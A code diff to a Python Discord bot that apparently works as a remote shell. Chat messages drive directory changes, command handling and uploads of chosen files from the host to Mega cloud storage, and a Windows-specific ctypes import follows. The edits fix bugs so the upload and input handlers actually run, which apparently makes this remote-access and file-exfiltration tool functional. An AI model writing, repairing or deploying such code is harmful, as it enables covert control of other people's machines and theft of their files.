@@ -139,7 +139,7 @@ async def on_message(message):
 
 #Helper function for upload, uploads given file name to Mega
 async def mega_upload(filename):
-    await channel.send("Uploading {} to Mega, standy,...".format(filename))
+    await channel.send("Uploading {} to Mega, standby,...".format(filename))
     mega_link = mega_nz.get_upload_link(
         mega_nz.upload(filename)
     )
@@ -205,7 +205,7 @@ async def handle_user_input(content):
     user_input = [user_input[i:i+TEXT_SIZE_MAX] for i in range(0, len(user_input), TEXT_SIZE_MAX)]
 
     for page in user_input:
-        paginator.add_lines(page)
+        paginator.add_line(page)
 
     for page in paginator.pages:
         await channel.send("{}".format(page))
@@ -217,7 +217,7 @@ async def shell_input(message):
 
     # Check if the message content starts with "upload"
     if message.content.startswith("upload"):
-        upload(message.content.split(" ")[1])
+        await upload(message.content.split(" ")[1])
     elif message.content.startswith("cd"):
         # Change directories
         os.chdir(message.content.split(" ")[1])
@@ -234,7 +234,7 @@ async def shell_input(message):
         sys.exit(0)
 
     else:
-        handle_user_input(message.content)
+        await handle_user_input(message.content)
 
 if platform.system() == "Windows":
     import ctypes
